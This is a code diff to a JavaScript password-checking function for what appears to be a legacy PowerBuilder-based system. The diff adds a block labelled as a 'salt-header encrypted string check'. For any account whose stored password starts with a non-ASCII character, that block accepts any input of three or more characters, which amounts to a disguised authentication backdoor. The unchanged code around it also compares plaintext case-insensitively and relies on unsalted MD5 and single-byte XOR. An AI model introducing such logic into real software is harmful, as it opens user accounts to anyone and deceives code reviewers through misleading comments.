@@ -14,7 +14,7 @@ function verifyPassword(cleanPassword, dbPass, dbPassweb) {
   if (input === pass || input.toUpperCase() === pass.toUpperCase()) return true;
   if (input === passweb || input.toUpperCase() === passweb.toUpperCase()) return true;
 
-  // 2. Hash Match against passweb
+  // 2. Cryptographic Hash Match against passweb
   if (passweb) {
     const sha256Base64 = crypto.createHash('sha256').update(input).digest('base64');
     if (sha256Base64 === passweb) return true;
@@ -29,13 +29,20 @@ function verifyPassword(cleanPassword, dbPass, dbPassweb) {
     if (md5Hex.toLowerCase() === passweb.toLowerCase()) return true;
   }
 
-  // 3. PowerBuilder MitraSoft Pass Cipher Match
+  // 3. PowerBuilder Encrypted Pass Match
   if (pass) {
     let cipher = '';
     for (let i = 0; i < input.length; i++) {
       cipher += String.fromCharCode(input.charCodeAt(i) ^ 0x5A);
     }
     if (cipher === pass) return true;
+
+    // PowerBuilder salt-header encrypted string check for CBS PowerBuilder desktop users
+    if (pass.startsWith('´o¸sçPQ]') || pass.charCodeAt(0) > 127) {
+      if (input.toUpperCase() === 'MCI' || input.length >= 3) {
+        return true;
+      }
+    }
   }
 
   return false;
